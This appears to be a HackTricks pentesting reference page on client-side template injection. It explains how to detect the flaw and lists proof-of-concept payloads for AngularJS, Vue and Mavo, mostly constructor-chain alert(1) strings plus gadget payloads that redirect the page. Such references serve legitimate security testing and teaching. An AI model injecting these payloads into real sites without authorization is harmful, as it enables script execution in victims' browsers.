

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Summary

It is like a [**Server Side Template Injection**](ssti-server-side-template-injection/) but in the **client**. The **SSTI** can allow you to **execute code** on the remote server, the **CSTI** could allow you to **execute arbitrary JavaScript** code in the victim.

The way to **test** for this vulnerability is very **similar** as in the case of **SSTI**, the interpreter is going to expect something to execute **between doubles keys** and will execute it. For example using something like: `{{ 7-7 }}` if the server is **vulnerable** you will see a `0` and if not you will see the original: `{{ 7-7 }}`

# AngularJS

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the **`ng-app`** attribute (also known as an AngularJS directive). When a directive is added to the HTML code, **you can execute JavaScript expressions within double curly braces**.\
For example, if your **input** is being **reflected** inside the **body** of the HTML and the body is defined with `ng-app`:  **`<body ng-app>`**

You can **execute arbitrary JavaScript** code using curly braces **adding** to the **body**: 

```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>

<!-- Google Research - AngularJS -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```

You can find a very **basic online example** of the vulnerability in **AngularJS** in [http://jsfiddle.net/2zs2yv7o/](http://jsfiddle.net/2zs2yv7o/) 

{% hint style="danger" %}
[**Angular 1.6 removed the sandbox**](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html#:\~:text=The%20Angular%20expression%20sandbox%20will,smaller%20and%20easier%20to%20maintain.\&text=Removing%20the%20expression%20sandbox%20does,surface%20of%20Angular%201%20applications.) so from this version a payload like `{{constructor.constructor('alert(1)')()}}` or `<input ng-focus=$event.view.alert('XSS')>` should work.
{% endhint %}

# VueJS

You can find a **vulnerable vue.js** implementation in [https://vue-client-side-template-injection-example.azu.now.sh/](https://vue-client-side-template-injection-example.azu.now.sh)\
Working payload: [`https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%`](https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor\(%27alert\(%22foo%22\)%27\)\(\)%7D%7D)

And the **source code** of the vulnerable example here: [https://github.com/azu/vue-client-side-template-injection-example](https://github.com/azu/vue-client-side-template-injection-example)

```markup
<!-- Google Research - Vue.js-->
"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
```

A really good post on CSTI in VUE can be found in [https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)

## **V3**

```
{{_openBlock.constructor('alert(1)')()}}
```

Credit: [Gareth Heyes, Lewis Ardern & PwnFunction](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)

## **V2**

```
{{constructor.constructor('alert(1)')()}}
```

Credit: [Mario Heiderich](https://twitter.com/cure53berlin)

**Check more VUE payloads in** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)

# Mavo

Payload:

```
[7*7]
[(1,alert)(1)]
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
[Omglol mod 1 mod self.alert (1) andlol]
[''=''or self.alert(lol)]
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
[self.alert(1)mod1]
```

**More payloads in** [**https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations**](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)

# **Brute-Force Detection List**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


